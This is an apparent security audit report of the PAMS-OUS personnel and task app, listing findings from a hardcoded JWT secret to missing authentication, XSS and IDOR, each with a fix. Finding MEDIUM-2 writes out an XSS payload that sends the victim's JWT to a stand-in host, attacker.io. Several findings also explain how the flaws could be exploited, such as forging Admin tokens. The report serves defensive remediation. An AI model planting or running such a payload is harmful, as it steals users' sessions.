# PAMS-OUS Security Audit Report
**Date:** 2026-06-11  
**Auditor:** Security Steward (Authorized Defensive Review)  
**Scope:** Full codebase audit -- backend/ and frontend/  
**Branch:** main @ commit 121eb3a

---

## Executive Summary

PAMS-OUS is a personnel and task management system for the PUP Office of the University Secretary. A successful attack could expose employee PII (names, emails, employee codes), allow impersonation of Admin accounts, tamper with task records, or generate fraudulent reports.

The audit found **no SQL injection vulnerabilities** -- parameterized queries are used consistently. Password hashing with argon2 is correctly applied. Several issues of High and Medium severity require remediation before production deployment.

The most critical issue is a **hardcoded JWT fallback secret** that allows anyone to forge Admin-role tokens if JWT_SECRET is absent from .env. The second most impactful class is **missing authentication on high-privilege Socket.IO events and REST routes** -- Admin-level operations (report generation, deletion, group management) can be performed by any connected client.

| Severity | Count | Issues |
|----------|-------|--------|
| Critical | 1 | Hardcoded JWT fallback secret |
| High | 3 | Unguarded socket events (reports), unguarded REST routes (admin sync), info disclosure in login |
| Medium | 4 | CORS substring matching, XSS via innerHTML, dev OTP code stored in DB, no rate limiting |
| Low | 3 | Password minimum inconsistency, getMyTasks IDOR, error messages leak internals |
| Info | 2 | JWT in sessionStorage, JWT_SECRET exported from authUtil |

---

## Finding Detail

---

### [CRITICAL-1] Hardcoded JWT Fallback Secret

**File:** backend/UserMngmt_APIs/authUtil.js:3  
**Status:** 🔴 VULNERABLE

Observed code at authUtil.js line 3:

    const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-key-change-this-in-env';

**Impact:** If JWT_SECRET is not set in .env (e.g., fresh deployment or misconfigured environment), the app signs and verifies tokens with the publicly known fallback string, which is visible in source code. An attacker can craft a JWT with payload { role: "ADMIN" }, sign it with this key, and be accepted as Admin by every route guarded by authenticateToken + authorizeRole(['ADMIN']). This grants full access to: delete any employee account, change any designation, manage all groups, generate or delete any report. Additionally, JWT_SECRET is exported from module.exports unnecessarily.

**Fix in authUtil.js:**

    const JWT_SECRET = process.env.JWT_SECRET;
    if (!JWT_SECRET) {
        console.error('[FATAL] JWT_SECRET is not set. Refusing to start.');
        process.exit(1);
    }

Remove JWT_SECRET from module.exports. Only generateToken and verifyToken need to be exported.

---

### [HIGH-1] No Authentication on Report Socket Events

**File:** backend/ReportMngmt_APIs/reportHandlers.js:8-202  
**Status:** 🔴 VULNERABLE

All four report socket events -- getReports, getReportDetails, generateReport, deleteReport -- have zero authentication checks. Any Socket.IO client that reaches the server can:

- Read the full report history (getReports)
- Read any report's task and update snapshot (getReportDetails)
- Create fake reports attributed to any date range (generateReport)
- Permanently delete any report (deleteReport)

The correct guard pattern exists in manage.js using a verifyAdmin() helper that reads socket.handshake.auth.token. The report module was written without applying it.

**Fix in reportHandlers.js -- add at the top of the connection handler:**

    const { verifyToken } = require('../UserMngmt_APIs/authUtil');
    const verifyAdmin = () => {
        const token = socket.handshake.auth?.token;
        const user = verifyToken(token);
        return user && user.role === 'ADMIN';
    };
    // Then guard each event:
    socket.on('getReports', async () => {
        if (!verifyAdmin()) return socket.emit('reportLog', { success: false, rawData: 'Unauthorized.' });
        // ... existing logic
    });
    // Apply same guard to getReportDetails, generateReport, deleteReport

---

### [HIGH-2] No Authentication on Admin Sync REST Routes

**File:** backend/server.js:73-196  
**Status:** 🔴 VULNERABLE

Seven /api/admin/sync/ routes are registered without any authentication middleware:

- GET /api/admin/sync/users -- returns all employee names, emails, roles, job titles, group memberships
- GET /api/admin/sync/groups
- POST /api/admin/sync/groups
- PUT /api/admin/sync/groups/:id
- DELETE /api/admin/sync/groups/:id
- GET /api/admin/sync/groups/:id/members
- PUT /api/admin/sync/groups/:id/members

An unauthenticated HTTP GET to /api/admin/sync/users returns the complete employee directory. Unauthenticated POST/PUT/DELETE calls can create, modify, or wipe groups with no token required. The equivalent routes in login.js (GET /api/users, POST /api/groups, etc.) are correctly guarded with authenticateToken, authorizeRole(['ADMIN']).

**Fix in server.js -- add guards to all 7 routes:**

    const { authenticateToken, authorizeRole } = require('./UserMngmt_APIs/authMiddleware');
    app.get('/api/admin/sync/users',
        authenticateToken, authorizeRole(['ADMIN']),
        async (req, res) => { ... });
    // Apply to all 7 routes

---

### [HIGH-3] Login Response Discloses Account Existence and Internal State

**File:** backend/UserMngmt_APIs/login.js:58-69 (Socket.IO), login.js:183 (REST)  
**Status:** 🔴 VULNERABLE

Socket.IO path (lines 58-69):
- Wrong password: emits rawData "Email: x@y.com\nValid: false\n"
- Account not found: emits rawData "Account not found!"
- Exception (line 69): emits rawData as the raw Node.js error string (potentially includes stack trace or DB error text)

REST path (line 183): Returns HTTP 404 for missing accounts versus HTTP 401 for wrong passwords.

These distinct responses allow an attacker to enumerate which email addresses have registered accounts. In PAMS-OUS this maps the entire employee email list, which is the precursor to targeted phishing.

**Fix -- collapse both failure cases to an identical response:**

Socket path:
    socket.emit('login_backendLog', { success: false, rawData: 'Invalid email or password.' });
    // catch block:
    } catch (err) {
        console.error('Login error:', err);
        socket.emit('login_backendLog', { success: false, rawData: 'An error occurred. Try again.' });
    }

REST path:
    res.status(401).json({ success: false, message: 'Invalid email or password.' });

Also remove the verbose rawData field ("Email: ... Valid: ...") from the success response.

---

### [MEDIUM-1] CORS Substring Matching Allows Origin Spoofing

**File:** backend/UserMngmt_APIs/login.js:17, backend/server.js:25-31  
**Status:** 🟡 NEEDS-ATTENTION

Observed code in login.js middleware:

    origin.includes('localhost') || origin.includes('127.0.0.1') || origin.includes('.ngrok-free.dev')

The .includes() check matches any string containing the substring. Origins such as https://evil-localhost.com or https://localhost.attacker.ngrok-free.dev.evil.io pass the check and have their origin reflected into Access-Control-Allow-Origin. Browsers then allow cross-origin fetch requests from those spoofed origins, including requests that carry the explicit Authorization header. The same pattern is in server.js for Socket.IO CORS.

**Fix -- exact allowlist in both login.js and server.js:**

    const ALLOWED_ORIGINS = new Set(
        [process.env.FRONTEND_ORIGIN, 'http://localhost:5500', 'http://127.0.0.1:5500'].filter(Boolean)
    );
    if (origin && ALLOWED_ORIGINS.has(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
    }

---

### [MEDIUM-2] XSS via innerHTML with Unsanitized Server Data

**Status:** 🔴 VULNERABLE

The following files build HTML from server-supplied data and assign it via innerHTML without HTML-encoding:

| File | Lines | Unsanitized Fields |
|------|-------|--------------------|
| frontend/js/dashboard.js | 127-131 | u.name (employee name), u.text (task update text) |
| frontend/js/dashboard.js | 144-151 | g.name (group name) |
| frontend/js/my-tasks.js | 172-179 | t.title, t.priority, t.status, t.assignedByName, t.description |
| frontend/js/reports.js | 217-234 | r.report_type, r.scope_target, r.generated_by_name |
| frontend/js/reports.js | 274-295 | t.title, t.assignee_name, t.historical_status, t.priority |
| frontend/js/reports.js | 329-347 | up.updated_by_name, up.updated_text |
| frontend/js/users-groups.js | 370 | gName (group name) |
| frontend/js/task-board.js | 219 | t.title, t.description, t.assignee.name, t.assignedByName |

**Impact:** An attacker with any account can store a script payload such as <img src=x onerror="fetch('https://attacker.io/steal?t='+sessionStorage.getItem('authToken'))"> in a task title, description, update note, employee name, or group name. When any user views the affected page, the payload executes, exfiltrating their JWT from sessionStorage. A stolen Admin JWT gives complete admin access.

**Fix -- add an HTML escape helper and apply to every server-supplied template value:**

    function htmlEsc(str) {
        return String(str == null ? '' : str)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;')
            .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }
    // Usage example in buildRow():
    // '<span class="tb-title">' + htmlEsc(t.title) + '</span>'
    // '<div class="tb-desc">' + htmlEsc(t.description || '') + '</div>'

For elements that display only text content, use element.textContent = value instead of innerHTML, which is inherently safe.

---

### [MEDIUM-3] Plaintext OTP Stored in Database When OTP_DELIVERY=console

**File:** backend/UserMngmt_APIs/otpService.js:77-79  
**Status:** 🟡 NEEDS-ATTENTION

When OTP_DELIVERY is "console" or "both", the plaintext OTP is written into the otp_codes.payload JSON column in MySQL as __dev_code. For registration flows this payload also contains full PII (name, employee code, middle name, suffix, email). There is no NODE_ENV check preventing this mode from being active in production.

**Fix in otpService.js deliveryMode():**

    function deliveryMode() {
        const mode = (process.env.OTP_DELIVERY || 'email').toLowerCase();
        if ((mode === 'console' || mode === 'both') && process.env.NODE_ENV === 'production') {
            console.error('[SECURITY] OTP_DELIVERY=console not permitted in production. Exiting.');
            process.exit(1);
        }
        return mode;
    }

---

### [MEDIUM-4] No Rate Limiting on Login, OTP, or Password Reset

**Files:** backend/UserMngmt_APIs/login.js, otp.js, passwordReset.js  
**Status:** 🟡 NEEDS-ATTENTION

No throttling exists on socket event sendAccDetails (password login), REST POST /api/auth/login, socket requestLoginOtp, or socket requestPasswordReset. The per-code OTP attempt cap (OTP_MAX_ATTEMPTS, default 5) is enforced, but an attacker can immediately request a new code after exhausting attempts, resetting the counter with no cooldown. An attacker can brute-force passwords or spam OTP emails to any target address without restriction.

**Fix -- add express-rate-limit to REST login and cooldown tracking for socket events:**

    const rateLimit = require('express-rate-limit');
    const loginLimiter = rateLimit({
        windowMs: 15 * 60 * 1000,  // 15 minutes
        max: 10,
        message: { success: false, message: 'Too many attempts. Try again in 15 minutes.' }
    });
    app.post('/api/auth/login', loginLimiter, async (req, res) => { ... });

For socket events, maintain a per-IP Map of last-request timestamps. Reject events where the gap from the last request is under a minimum cooldown (e.g., 60 seconds for OTP requests).

---

### [LOW-1] Password Minimum Length Inconsistency

**Files:** backend/UserMngmt_APIs/passwordReset.js, frontend/js/auth.js, frontend/js/users-groups.js, backend/UserMngmt_APIs/manage.js  
**Status:** ✅ REMEDIATED (2026-06-05)

**Original issue:** passwordReset.js and the signup form enforced 8 characters. The Admin edit-user modal in users-groups.js enforced only 6 characters. The REST POST /api/users/update-password endpoint in manage.js had no server-side minimum length check at all, so an Admin could set a 1-character password for any user via a direct API call.

**Remediation applied — a single centralized password policy now requires ≥8 characters with at least one uppercase letter, one lowercase letter, one number, and one symbol:**

- **Backend (authoritative):** Added `validatePassword()` / `PASSWORD_POLICY` to `passwordUtil.js` and enforced it on **every** password-write path before hashing:
  - `manage.js` — `POST /api/users/update-password` (previously unchecked)
  - `registration.js` — self-registration socket flow (`handleRequest`) and `POST /api/users` admin-add
  - `passwordReset.js` — `handleConfirm` (replaced the length-only check)
- **Frontend (UX):** Added `PAMS.validatePassword()` / `PAMS.PASSWORD_POLICY` to `api.js`, wired into `auth.js` (signup), `forgotPassword.js`, and the three `users-groups.js` admin password actions (replacing the stale `< 6` checks).
- **UI disclosure:** The requirement is now shown to users via an accessible hint (`<small>` + `aria-describedby`, `minlength="8"`) beneath every new-password field in personnel-auth.html, admin-login.html, forgot-password.html, and the users-groups.html add/edit/reset modals.

The backend remains the enforcement boundary — a direct API call that bypasses the UI is rejected with HTTP 400 / a socket error containing the policy message.

---

### [LOW-2] getMyTasks Accepts Arbitrary Email Without Ownership Verification (IDOR)

**File:** backend/TaskMngmt_APIs/taskController.js:62-65  
**Status:** 🟡 NEEDS-ATTENTION

Observed code:

    const userEmail = req.query.email;  // taken from query string, not from JWT

The GET /api/tasks/me route is protected by authenticateToken (any logged-in user), but it accepts the target email as a client-controlled query parameter. A logged-in Encoder can call GET /api/tasks/me?email=admin@pup.edu.ph and receive the Admin's task list, including task titles, descriptions, due dates, and assignment history.

**Fix:**

    const userEmail = req.user.email;  // read from verified JWT payload

---

### [LOW-3] Error Responses Leak Internal Database Error Messages

**Files:** backend/server.js:102,115 and multiple catch blocks throughout backend modules  
**Status:** 🟡 NEEDS-ATTENTION

Pattern: res.status(500).json({ error: e.message })

MySQL error messages sent to the client expose table names, column names, and constraint names. For example a duplicate-key error reads: "Duplicate entry 'value' for key 'Employees.PRIMARY'" -- revealing the table and key structure.

**Fix:**

    } catch (e) {
        console.error('Internal server error:', e);
        res.status(500).json({ error: 'An internal error occurred.' });
    }

---

### [INFO-1] JWT Token Stored in sessionStorage

**File:** frontend/js/api.js:12

sessionStorage is not shared across browser tabs (unlike localStorage) and is acceptable for this internal LAN application once the XSS findings (MEDIUM-2) are resolved. For a public-facing deployment, HttpOnly cookies as the token transport would eliminate client-JS-readable token storage entirely.

---

### [INFO-2] JWT_SECRET Exported from authUtil

**File:** backend/UserMngmt_APIs/authUtil.js:20

No external caller uses the exported JWT_SECRET value. Exporting raw secret material is unnecessary surface area and risks accidental logging. Remove from exports when applying the CRITICAL-1 fix.

---

## What Was Checked and Found SAFE

### SQL Injection -- SAFE

Every db.query() call across all backend files was reviewed. All queries use parameterized placeholders (?). No user input is string-concatenated into SQL. Verified locations:

- dbChecks.js:2,12 -- WHERE email = ?, OR employee_code = ?
- login.js -- all 15+ query calls use [param] arrays
- manage.js:46,75,156,176,195,202 -- all parameterized
- registration.js:139 -- 10-value INSERT, all parameterized
- otpService.js:61,81,110,138,145 -- all parameterized
- passwordReset.js:88 -- WHERE employee_id = ?
- taskModel.js -- all parameterized; findAll() WHERE clause built from internal boolean flags, not user input
- reportHandlers.js -- all parameterized
- userSearch.js:33 -- LIKE wildcard correctly built as a parameter value: wildcardQuery = '%' + searchString + '%' passed in the array, not concatenated into SQL
- server.js sync routes -- all parameterized; IN (placeholders) built by mapping array length, values passed as the parameter array

### Password Hashing -- SAFE

- argon2.hash() used for all password storage paths (registration, admin user creation, password reset, admin password update).
- argon2.verify() used for all password verification.
- verify_pass() throws on a malformed hash format (guard at passwordUtil.js:9). Callers wrap in try/catch and fail closed (deny access) on exception.
- OTP codes stored as argon2 hashes (otpService.js:67), verified with argon2.verify() at line 135 -- constant-time comparison, not string equality.

### OTP Implementation -- SAFE (with MEDIUM-3 caveat)

- Codes generated via crypto.randomInt(0, 10) -- CSPRNG, not Math.random().
- TTL enforced in verifyOtp() at line 128.
- Attempt cap enforced at line 131 (row.attempts >= maxAttempts()).
- Single-use: used_at = NOW() set on success (line 145). Stale codes invalidated when a new code is requested (line 61).
- VALID_PURPOSES and VALID_CHANNELS Sets prevent purpose and channel spoofing.

### JWT Algorithm -- SAFE

jwt.verify() in authUtil.js defaults to HS256 HMAC. No empty algorithms: [] list is configured, and no RS256 public key is present, so the algorithm confusion attack is not applicable. Role claims (id, email, role) are set server-side from the database designation column at login -- the client cannot influence the role claim during authentication.

### Role Authorization -- SAFE

authorizeRole() reads req.user.role, set exclusively by verifyToken() from the signed JWT -- no client-controlled injection path. The socket-side verifyAdmin() in manage.js and userSearch.js reads from socket.handshake.auth.token (the Socket.IO auth credential) and verifies it cryptographically before any privileged action.

### Secrets in Source -- SAFE

- .env is gitignored in backend/.gitignore and the root .gitignore. Only .env.example is tracked, with placeholder values only.
- No hardcoded API keys, database passwords, or SMTP credentials found in any .js file. The only hardcoded secret-like value is the JWT fallback addressed in CRITICAL-1.
- DB_PASSWORD in server.js:48 uses process.env.DB_PASSWORD with no fallback -- the database refuses to connect rather than use a blank password.

### Task Access Control -- MOSTLY SAFE

- GET /api/tasks and GET /api/tasks/me protected by authenticateToken.
- POST /api/tasks and DELETE /api/tasks/:id additionally protected by authorizeRole(['Admin', 'Chief']).
- PUT /api/tasks/:id applies internal role checks: non-Admin/Chief users cannot modify title, description, priority, or dueDate.
- Minor integrity note: POST /api/tasks/updates accepts an email from the request body -- any authenticated user could log an update attributed to any email. This is a data integrity concern but not a privilege escalation.

---

## Remediation Checklist

Ordered by severity and recommended implementation sequence:

- [ ] **[CRITICAL-1]** Remove JWT fallback string from authUtil.js:3; add process.exit(1) if JWT_SECRET is absent; remove JWT_SECRET from module.exports
- [ ] **[HIGH-1]** Add verifyAdmin() guard to all four socket event handlers in reportHandlers.js
- [ ] **[HIGH-2]** Add authenticateToken, authorizeRole(['ADMIN']) middleware to all 7 /api/admin/sync/ routes in server.js
- [ ] **[HIGH-3]** Collapse "account not found" and "wrong password" to identical response text in socket and REST login paths; replace raw error emission with generic messages
- [ ] **[MEDIUM-1]** Replace .includes() CORS checks in login.js and server.js with exact Set.has() allowlist
- [ ] **[MEDIUM-2]** Add htmlEsc() helper to frontend JS; apply to all server-supplied values inside innerHTML template literals across dashboard.js, my-tasks.js, reports.js, users-groups.js, task-board.js
- [ ] **[MEDIUM-3]** Add NODE_ENV === 'production' guard in otpService.js deliveryMode() to block console/both mode in production
- [ ] **[MEDIUM-4]** Add express-rate-limit to POST /api/auth/login; add per-socket or per-IP cooldowns for OTP request and socket login events
- [x] **[LOW-1]** ✅ Centralized password policy (≥8 chars + upper/lower/number/symbol) enforced server-side on all password-write paths, mirrored client-side, and disclosed in the UI (2026-06-05)
- [ ] **[LOW-2]** Change getMyTasks in taskController.js to read email from req.user.email instead of req.query.email
- [ ] **[LOW-3]** Replace res.status(500).json({ error: e.message }) with generic message; log full error server-side in all catch blocks
- [ ] **[INFO]** Remove JWT_SECRET from authUtil.js exports (accomplished as part of CRITICAL-1 fix)
- [ ] **[INFO]** Consider reading email from the verified JWT instead of client-supplied data in the register_session socket event in login.js

---

*This report was produced by an authorized defensive review of the PAMS-OUS project codebase at commit 121eb3a. No exploit code was written or tested against live systems.*
